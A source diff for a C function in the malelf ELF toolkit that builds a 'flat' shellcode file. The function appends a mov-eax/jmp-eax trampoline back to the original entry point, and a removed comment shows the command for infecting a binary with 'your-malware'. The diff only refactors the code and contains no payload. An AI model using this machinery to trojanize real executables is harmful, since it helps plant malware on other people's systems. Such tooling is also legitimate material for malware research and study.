@@ -33,12 +33,15 @@
 #include <string.h>
 #include <sys/types.h>
 #include <assert.h>
+#include <errno.h>
 
 #include <elf.h>
 #include <sys/mman.h>
 
+#include <malelf/defines.h>
 #include <malelf/types.h>
 #include <malelf/error.h>
+#include <malelf/debug.h>
 #include <malelf/binary.h>
 #include <malelf/defines.h>
 #include <malelf/shellcode.h>
@@ -61,15 +64,23 @@ _u32 malelf_shellcode_get_c_string(FILE *fp, MalelfBinary *bin)
         return MALELF_SUCCESS;
 }
 
-_i32 malelf_shellcode_create_flat(FILE* fd_o,
-                                 int in_size,
-                                 FILE* fd_i,
-                                 unsigned long int original_entry_point,
-                                 unsigned long int magic_bytes) {
-        _u8 *mem = NULL;
-        _i32 count = 0;
+_u32 malelf_shellcode_create_flat(MalelfBinary *output,
+                                  MalelfBinary *shellcode,
+                                  _u32 *magic_offset,
+                                  unsigned long int original_entry_point,
+                                  unsigned long int magic_bytes)
+{
+        _u32 count = 0;
+        _u32 error;
+        FILE *ofd;
 
         union malelf_dword entry_point;
+
+        assert (NULL != shellcode);
+        assert (NULL != output);
+        assert (NULL != shellcode->mem);
+        assert (shellcode->size > 0);
+        assert (NULL != output->fname);
 
         if (original_entry_point > 0) {
                 entry_point.long_val = original_entry_point;
@@ -79,35 +90,48 @@ _i32 malelf_shellcode_create_flat(FILE* fd_o,
                 entry_point.long_val = MALELF_MAGIC_BYTES;
         }
 
-        mem = mmap(0, in_size, PROT_READ, MAP_SHARED, fileno(fd_i), 0);
-        if (mem == MAP_FAILED) {
-                LOG_ERROR("Failed to map binary in memory...\n");
-                return MALELF_EALLOC;
+        error = malelf_binary_create(output, 1);
+
+        if (MALELF_SUCCESS != error) {
+                MALELF_DEBUG_ERROR("Failed to create empty binary file"
+                                   " '%s'.", output->fname);
+                return error;
         }
 
-        while (count < in_size) {
-                count += fwrite(mem + count, sizeof(_u8), 1, fd_o);
+        error = malelf_binary_mmap_from(output, shellcode);
+
+        ofd = fdopen(output->fd, "w+");
+
+        if (NULL == ofd) {
+                munmap(output->mem, output->size);
+                return errno;
         }
 
-        fwrite("\xb8", sizeof(_u8), 1, fd_o);
+        while (count < shellcode->size) {
+                count += fwrite(shellcode->mem + count,
+                                sizeof(_u8),
+                                1,
+                                ofd);
+        }
+
+        fwrite("\xb8", sizeof(_u8), 1, ofd);
         count++;
-        fwrite(&entry_point.char_val[0], 1, 1, fd_o);
-        fwrite(&entry_point.char_val[1], 1, 1, fd_o);
-        fwrite(&entry_point.char_val[2], 1, 1, fd_o);
-        fwrite(&entry_point.char_val[3], 1, 1, fd_o);
+        fwrite(&entry_point.char_val[0], 1, 1, ofd);
+        fwrite(&entry_point.char_val[1], 1, 1, ofd);
+        fwrite(&entry_point.char_val[2], 1, 1, ofd);
+        fwrite(&entry_point.char_val[3], 1, 1, ofd);
         /* jmp eax */
-        fwrite("\xff\xe0", sizeof(_u8), 2, fd_o);
+        fwrite("\xff\xe0", sizeof(_u8), 2, ofd);
 
-        //        LOG_SUCCESS("New shellcode created successfully\n");
-        //        LOG_SUCCESS("Now you can use: malelf infect -m 0 -f %d -p <your-malware> -i <binary-to-infect> -o <infected-file>\n", count);
+        *magic_offset = count;
 
         return MALELF_SUCCESS;
 }
 
 _i32 malelf_shellcode_create_c(FILE* fd_o,
-                       int in_size,
-                       FILE* fd_i,
-                       unsigned long int original_entry_point) {
+                               int in_size,
+                               FILE* fd_i,
+                               unsigned long int original_entry_point) {
         _u8 *mem, i, count = 0;
 
         union entry_t {
